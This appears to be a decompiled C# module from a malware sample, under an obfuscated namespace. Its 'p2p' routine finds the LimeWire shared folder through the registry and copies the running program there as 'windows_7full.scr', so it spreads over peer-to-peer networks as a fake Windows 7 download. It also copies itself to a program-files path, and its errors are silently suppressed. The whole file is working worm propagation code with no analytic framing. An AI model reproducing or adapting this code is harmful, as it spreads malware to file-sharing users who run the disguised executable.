using System;
using System.IO;
using System.Windows.Forms;
using AdasdASDwdadwAWD.My;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;

namespace AdasdASDwdadwAWD;

[StandardModule]
internal sealed class p2p
{
	private static string LimePfad = Conversions.ToString(((ServerComputer)MyProject.Computer).get_Registry().GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\LimeWire\\", "Shared", (object)0));

	public static void p2p_sp()
	{
		try
		{
			string text = "windows_7full.scr";
			File.Copy(Application.get_ExecutablePath(), LimePfad + text);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			string text2 = "windows_7full.scr";
			File.Copy(Application.get_ExecutablePath(), Interaction.Environ("programfiles\\Shared\\" + text2));
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}
}
